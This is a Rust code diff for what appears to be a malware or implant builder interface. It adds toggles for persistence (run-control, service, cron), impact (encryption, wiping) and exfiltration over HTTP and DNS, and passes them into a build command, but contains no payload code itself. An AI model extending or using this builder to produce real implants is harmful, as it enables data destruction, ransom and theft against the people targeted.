@@ -14,9 +14,22 @@ pub enum Command {
         url: String,
         port: String,
         debug: bool,
+
+        // persistence
         persistence: bool,
+        persist_runcontrol: bool,
+        persist_service: bool,
+        persist_cron: bool,
+
+        // impact
         impact: bool,
-        exfil: bool
+        impact_encrypt: bool,
+        impact_wipe: bool,
+
+        // exfiltration
+        exfil: bool,
+        exfil_http: bool,
+        exfil_dns: bool
     }
 }
 
@@ -203,6 +216,14 @@ fn handle_enter(app: &mut AppState) -> Option<Command> {
             if app.builder.selected_field == BuilderField::Submit {
                 return handle_build_start(app);
             }
+
+            if app.builder.selected_field == BuilderField::CategorySelect {
+                app.builder.active_category = app.builder.active_category.next();
+                app.builder.next_field();
+                app.builder.selected_field = BuilderField::CategorySelect;
+
+                return None;
+            }
             
             match app.builder.selected_field {
                 BuilderField::Url | BuilderField::Port => app.builder.next_field(),
@@ -332,9 +353,19 @@ fn handle_builder_toggle(app: &mut AppState) {
 
     match app.builder.selected_field {
         EnableDebug => app.builder.enable_debug = !app.builder.enable_debug,
-        EnablePersistence => app.builder.enable_persistence = !app.builder.enable_persistence,
-        EnableImpact => app.builder.enable_impact = !app.builder.enable_impact,
-        EnableExfil => app.builder.enable_exfil = !app.builder.enable_exfil,
+
+        PersistToggle => app.builder.enable_persistence = !app.builder.enable_persistence,
+        PersistRunControl => app.builder.persist_runcontrol = !app.builder.persist_runcontrol,
+        PersistService => app.builder.persist_service = !app.builder.persist_service,
+        PersistCron => app.builder.persist_cron = !app.builder.persist_cron,
+
+        ImpactToggle => app.builder.enable_impact = !app.builder.enable_impact,
+        ImpactEncrypt => app.builder.impact_encrypt = !app.builder.impact_encrypt,
+        ImpactWipe => app.builder.impact_wipe = !app.builder.impact_wipe,
+
+        ExfilToggle => app.builder.enable_exfil = !app.builder.enable_exfil,
+        ExfilHttp => app.builder.exfil_http = !app.builder.exfil_http,
+        ExfilDns => app.builder.exfil_dns = !app.builder.exfil_dns,
         _ => {}
     }
 }
@@ -348,7 +379,16 @@ fn handle_build_start(app: &mut AppState) -> Option<Command> {
         port: app.builder.target_port.clone(),
         debug: app.builder.enable_debug,
         persistence: app.builder.enable_persistence,
+        persist_runcontrol: app.builder.persist_runcontrol,
+        persist_service: app.builder.persist_service,
+        persist_cron: app.builder.persist_cron,
+
         impact: app.builder.enable_impact,
-        exfil: app.builder.enable_exfil
+        impact_encrypt: app.builder.impact_encrypt,
+        impact_wipe: app.builder.impact_wipe,
+
+        exfil: app.builder.enable_exfil,
+        exfil_http: app.builder.exfil_http,
+        exfil_dns: app.builder.exfil_dns
     })
 }
